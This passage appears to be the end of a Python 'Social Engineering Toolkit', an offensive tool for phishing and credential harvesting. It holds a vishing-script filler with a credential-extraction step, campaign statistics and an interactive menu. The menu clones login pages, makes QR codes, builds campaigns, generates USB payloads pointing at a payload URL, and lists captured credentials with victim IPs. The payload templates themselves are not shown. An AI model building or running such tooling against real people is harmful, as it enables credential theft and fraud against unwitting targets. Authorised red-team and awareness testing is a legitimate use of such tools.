            'exec_title': 'Chief Executive Officer',
            'cfo_name': 'the CFO',
            'url': 'http://secure-verify.company.local',
            'domain': 'company.com',
        }
        defaults.update(target_info)

        def fill(text):
            if isinstance(text, str):
                for k, v in defaults.items():
                    text = text.replace('{' + k + '}', str(v))
                return text
            elif isinstance(text, list):
                return [fill(item) for item in text]
            elif isinstance(text, dict):
                return {k: fill(v) for k, v in text.items()}
            return text

        result['opening'] = fill(script['opening'])
        result['key_questions'] = fill(script['key_questions'])
        result['credential_extraction'] = fill(script['credential_extraction'])
        result['objection_handling'] = fill(script['objection_handling'])
        result['closing'] = fill(script['closing'])

        return result

    def list_vishing_scenarios(self) -> List[Dict[str, str]]:
        """List available vishing scenarios."""
        return [
            {'id': k, 'name': v['name'], 'description': v['description']}
            for k, v in VISHING_SCRIPTS.items()
        ]

    # ── Statistics ───────────────────────────────────────────────────────────

    def get_stats(self) -> Dict[str, Any]:
        """Overall campaign and capture statistics."""
        total_campaigns = len(self._campaigns)
        active_campaigns = sum(1 for c in self._campaigns if c.get('status') == 'active')
        total_captures = len(self._captures)
        total_pages = len(self.list_cloned_pages())

        # Unique IPs captured
        unique_ips = len(set(c.get('ip', '') for c in self._captures if c.get('ip')))

        # Captures by page
        page_counts = {}
        for cap in self._captures:
            pid = cap.get('page_id', 'unknown')
            page_counts[pid] = page_counts.get(pid, 0) + 1

        return {
            'total_campaigns': total_campaigns,
            'active_campaigns': active_campaigns,
            'total_captures': total_captures,
            'total_pages': total_pages,
            'unique_ips': unique_ips,
            'captures_by_page': page_counts,
        }


# ── Singleton ────────────────────────────────────────────────────────────────

_instance = None
_lock = threading.Lock()


def get_social_eng() -> SocialEngToolkit:
    global _instance
    if _instance is None:
        with _lock:
            if _instance is None:
                _instance = SocialEngToolkit()
    return _instance


# ── Interactive CLI ──────────────────────────────────────────────────────────

def run():
    """Interactive CLI for Social Engineering Toolkit."""
    import sys
    sys.path.insert(0, str(Path(__file__).parent.parent))
    from core.banner import Colors, clear_screen, display_banner

    toolkit = get_social_eng()

    while True:
        print("\n" + "=" * 60)
        print("  SOCIAL ENGINEERING TOOLKIT")
        print("  Phishing, pretexts, QR codes, USB payloads")
        print("=" * 60)

        stats = toolkit.get_stats()
        print(f"  Campaigns: {stats['total_campaigns']}  |  "
              f"Pages: {stats['total_pages']}  |  "
              f"Captures: {stats['total_captures']}")
        print()
        print("  1 — Clone Login Page")
        print("  2 — Generate QR Code")
        print("  3 — Create Campaign")
        print("  4 — USB Payload")
        print("  5 — View Captures")
        print("  6 — Pretext Templates")
        print("  7 — Vishing Scripts")
        print("  0 — Back")
        print()

        choice = input("  Select: ").strip()

        if choice == '0':
            break
        elif choice == '1':
            _cli_clone_page(toolkit)
        elif choice == '2':
            _cli_generate_qr(toolkit)
        elif choice == '3':
            _cli_create_campaign(toolkit)
        elif choice == '4':
            _cli_usb_payload(toolkit)
        elif choice == '5':
            _cli_view_captures(toolkit)
        elif choice == '6':
            _cli_pretexts(toolkit)
        elif choice == '7':
            _cli_vishing(toolkit)


def _cli_clone_page(toolkit: SocialEngToolkit):
    """Clone a login page."""
    print("\n--- Clone Login Page ---")
    url = input("  Target URL: ").strip()
    if not url:
        print("  [!] URL required")
        return

    print(f"  Cloning {url}...")
    result = toolkit.clone_page(url)
    if result['ok']:
        print(f"  [+] Page cloned successfully")
        print(f"      Page ID: {result['page_id']}")
        print(f"      Domain:  {result['domain']}")
        print(f"      Size:    {result['size']} bytes")
        print(f"      Path:    {result['path']}")
    else:
        print(f"  [-] {result['error']}")


def _cli_generate_qr(toolkit: SocialEngToolkit):
    """Generate a QR code."""
    print("\n--- Generate QR Code ---")
    url = input("  URL to encode: ").strip()
    if not url:
        print("  [!] URL required")
        return
    label = input("  Label (optional): ").strip() or None
    size_str = input("  Size [300]: ").strip()
    size = int(size_str) if size_str.isdigit() else 300

    result = toolkit.generate_qr(url, label=label, size=size)
    if result['ok']:
        print(f"  [+] QR code generated")
        print(f"      URL:   {result['url']}")
        print(f"      Size:  {result['size']}px")
        print(f"      B64 length: {len(result['base64'])} chars")
    else:
        print(f"  [-] {result['error']}")


def _cli_create_campaign(toolkit: SocialEngToolkit):
    """Create a campaign."""
    print("\n--- Create Campaign ---")
    name = input("  Campaign Name: ").strip()
    if not name:
        print("  [!] Name required")
        return

    print("  Vectors: email, qr, usb, vishing, physical")
    vector = input("  Attack Vector: ").strip() or 'email'

    targets_str = input("  Targets (comma-separated, optional): ").strip()
    targets = [t.strip() for t in targets_str.split(',') if t.strip()] if targets_str else []

    pretext = input("  Pretext (optional): ").strip() or None

    campaign = toolkit.create_campaign(name, vector, targets, pretext)
    print(f"  [+] Campaign created: {campaign['id']}")
    print(f"      Name:    {campaign['name']}")
    print(f"      Vector:  {campaign['vector']}")
    print(f"      Targets: {len(campaign['targets'])}")


def _cli_usb_payload(toolkit: SocialEngToolkit):
    """Generate a USB payload."""
    print("\n--- USB Payload Generator ---")
    print("  Types:")
    types = list(USB_PAYLOAD_TEMPLATES.keys())
    for i, t in enumerate(types, 1):
        info = USB_PAYLOAD_TEMPLATES[t]
        print(f"    {i} — {info['name']}: {info['description']}")

    choice = input("  Select type: ").strip()
    try:
        idx = int(choice) - 1
        if not (0 <= idx < len(types)):
            print("  [!] Invalid selection")
            return
    except ValueError:
        print("  [!] Invalid selection")
        return

    payload_type = types[idx]
    payload_url = input("  Payload URL [http://10.0.0.1:8080/payload]: ").strip()

    params = {}
    if payload_url:
        params['payload_url'] = payload_url

    result = toolkit.generate_usb_payload(payload_type, params)
    if result['ok']:
        print(f"\n  [+] {result['name']} payload generated:")
        print("  " + "-" * 50)
        for line in result['payload'].split('\n'):
            print(f"  {line}")
        print("  " + "-" * 50)
    else:
        print(f"  [-] {result['error']}")


def _cli_view_captures(toolkit: SocialEngToolkit):
    """View captured credentials."""
    captures = toolkit.get_captures()
    if not captures:
        print("\n  No captures recorded yet")
        return

    print(f"\n--- Captured Credentials ({len(captures)} total) ---")
    for cap in captures:
        ts = cap.get('timestamp', 'unknown')[:19]
        ip = cap.get('ip', 'unknown')
        page = cap.get('page_id', 'unknown')
        creds = cap.get('credentials', {})
        cred_str = ', '.join(f"{k}={v}" for k, v in creds.items())
        print(f"  [{ts}] Page: {page} | IP: {ip}")
        print(f"           Credentials: {cred_str}")


def _cli_pretexts(toolkit: SocialEngToolkit):
    """Browse pretext templates."""
    print("\n--- Pretext Templates ---")
    categories = list(PRETEXT_TEMPLATES.keys())
    for i, cat in enumerate(categories, 1):
        count = len(PRETEXT_TEMPLATES[cat])
        print(f"  {i} — {cat.replace('_', ' ').title()} ({count} templates)")

    choice = input("\n  Select category (or Enter for all): ").strip()
    if choice.isdigit() and 1 <= int(choice) <= len(categories):
        cat = categories[int(choice) - 1]
        templates = {cat: PRETEXT_TEMPLATES[cat]}
    else:
        templates = PRETEXT_TEMPLATES

    for cat, tpls in templates.items():
        print(f"\n  === {cat.replace('_', ' ').title()} ===")
        for tpl in tpls:
            print(f"\n  [{tpl['name']}]")
            print(f"  Subject: {tpl['subject']}")
            body_preview = tpl['body'][:150].replace('\n', ' ')
            print(f"  Body: {body_preview}...")
            print(f"  Notes: {tpl['pretext_notes']}")


def _cli_vishing(toolkit: SocialEngToolkit):
    """Browse vishing scripts."""
    print("\n--- Vishing Scripts ---")
    scenarios = list(VISHING_SCRIPTS.keys())
    for i, sid in enumerate(scenarios, 1):
        info = VISHING_SCRIPTS[sid]
        print(f"  {i} — {info['name']}: {info['description']}")

    choice = input("\n  Select scenario: ").strip()
    try:
        idx = int(choice) - 1
        if not (0 <= idx < len(scenarios)):
            print("  [!] Invalid selection")
            return
    except ValueError:
        print("  [!] Invalid selection")
        return

    scenario = scenarios[idx]
    target_name = input("  Target name (optional): ").strip()
    target_info = {}
    if target_name:
        target_info['target_name'] = target_name

    result = toolkit.generate_vishing_script(scenario, target_info)
    if result['ok']:
        print(f"\n  === {result['name']} ===")
        print(f"\n  OPENING:")
        print(f"  {result['opening']}")
        print(f"\n  KEY QUESTIONS:")
        for q in result['key_questions']:
            print(f"    - {q}")
        print(f"\n  CREDENTIAL EXTRACTION:")
        print(f"  {result['credential_extraction']}")
        print(f"\n  OBJECTION HANDLING:")
        for obj, resp in result['objection_handling'].items():
            print(f"    [{obj}]: {resp}")
        print(f"\n  CLOSING:")
        print(f"  {result['closing']}")
    else:
        print(f"  [-] {result['error']}")
